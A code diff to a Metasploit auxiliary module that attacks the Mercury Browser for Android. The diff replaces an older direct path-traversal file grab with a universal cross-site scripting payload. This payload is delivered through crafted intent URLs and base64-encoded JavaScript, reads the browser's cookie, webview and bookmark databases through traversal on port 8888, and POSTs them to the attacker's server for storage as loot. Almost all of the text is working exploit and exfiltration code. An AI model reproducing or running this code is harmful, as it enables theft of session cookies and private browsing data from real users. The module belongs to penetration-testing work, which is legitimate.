@@ -8,6 +8,7 @@ require 'msf/core'
 class Metasploit3 < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpServer::HTML
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
@@ -22,56 +23,18 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         =>
         [
           'rotlogix', # Vuln discovery, PoC, etc
-          'sinn3r'
+          'sinn3r',
+          'joev'
         ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
-          [ 'URL', 'http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/' ]
+          [ 'URL', 'http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/' ],
+          [ 'URL', 'http://versprite.com/og/multiple-vulnerabilities-in-mercury-browser-for-android-version-3-0-0/' ]
         ]
     ))
-  end
 
-  def send_http_request(rhost, opts={})
-    res = nil
-    cli = Rex::Proto::Http::Client.new(rhost, 8888)
 
-    begin
-      cli.connect
-      req = cli.request_cgi(opts)
-      res = cli.send_recv(req)
-    rescue ::EOFError, Errno::ETIMEDOUT ,Errno::ECONNRESET, Rex::ConnectionError,
-      OpenSSL::SSL::SSLError, ::Timeout::Error => e
-      return nil
-    ensure
-      cli.close
-    end
-
-    res
-  end
-
-  def get_xml_files(rhost)
-    base_dir = '../../../../data/data/com.ilegendsoft.mercury'
-
-    ['/mercury_database.db', '/shared_prefs/passcode.xml'].each do |item|
-      opts = {
-        'method' => 'GET',
-        'uri' => '/dodownload',
-        'vars_get' => {
-          'fname' => "#{base_dir}#{item}"
-        },
-        'headers' => {
-          'Referer' => "http://#{rhost}:8888/storage/emulated/0/Download/"
-        }
-      }
-
-      print_status("Retrieving #{item}")
-      res = send_http_request(rhost, opts)
-      next unless res
-      print_status("Server response: #{res.code}")
-      p = store_loot('android.mercury.file', 'application/octet-stream', rhost, res.body)
-      print_good("#{item} saved as: #{p}")
-    end
   end
 
   def is_android?(user_agent)
@@ -87,10 +50,60 @@ class Metasploit3 < Msf::Auxiliary
     <body>
     <script>
     location.href="intent:#Intent;SEL;component=com.ilegendsoft.mercury/.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end";
+    setTimeout(function() {
+      location.href="intent:#Intent;S.load=javascript:eval(atob('#{Rex::Text.encode_base64(uxss)}'));SEL;component=com.ilegendsoft.mercury/com.ilegendsoft.social.common.SimpleWebViewActivity;end";
+    }, 500);
     </script>
     </body>
     </html>
     |
+  end
+
+  def backend_url
+    proto = (datastore['SSL'] ? 'https' : 'http')
+    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
+    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
+    resource = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
+
+    "#{proto}://#{my_host}#{port_str}#{resource}/catch"
+  end
+
+  def uxss
+    %Q|
+      function exploit() {
+        history.replaceState({},{},'/storage/emulated/0/Download/');
+        var urls = #{JSON.generate(file_urls)};
+        urls.forEach(function(url) {
+          var x = new XMLHttpRequest();
+          x.open('GET', '/dodownload?fname=../../../..'+url);
+          x.responseType = 'arraybuffer';
+          x.send();
+          x.onload = function(){
+            var buff = new Uint8Array(x.response);
+            var hex = Array.prototype.map.call(buff, function(d) {
+              var c = d.toString(16);
+              return (c.length < 2) ? 0+c : c;
+            }).join('');
+            var send = new XMLHttpRequest();
+            send.open('POST', '#{backend_url}/'+encodeURIComponent(url.replace(/.*\\//,'')));
+            send.setRequestHeader('Content-type', 'text/plain');
+            send.send(hex);
+          };
+        });
+      }
+
+      var q = window.open('http://localhost:8888/','x');
+      q.onload = function(){ q.eval('('+exploit.toString()+')()'); };
+    |
+  end
+
+  def file_urls
+    [
+      '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromium.db',
+      '/data/data/com.ilegendsoft.mercury/databases/webviewCookiesChromiumPrivate.db',
+      '/data/data/com.ilegendsoft.mercury/databases/webview.db',
+      '/data/data/com.ilegendsoft.mercury/databases/bookmarks.db'
+    ]
   end
 
   def on_request_uri(cli, req)
@@ -102,14 +115,27 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
+    if req.method =~ /post/i
+      if req.body
+        filename = File.basename(req.uri) || 'file'
+        output = store_loot(
+          filename, 'text/plain', cli.peerhost, hex2bin(req.body), filename, 'Android mercury browser file'
+        )
+        print_good("Stored #{req.body.bytes.length} bytes to #{output}")
+      end
+
+      return
+    end
+
     print_status('Sending HTML...')
     html = get_html
     send_response_html(cli, html)
-
-    print_status("Attempting to connect to: http://#{cli.peerhost}:8888/")
-    sleep(2)
-    get_xml_files(cli.peerhost)
   end
+
+  def hex2bin(hex)
+    hex.chars.each_slice(2).map(&:join).map { |c| c.to_i(16) }.map(&:chr).join
+  end
+
 
   def run
     exploit
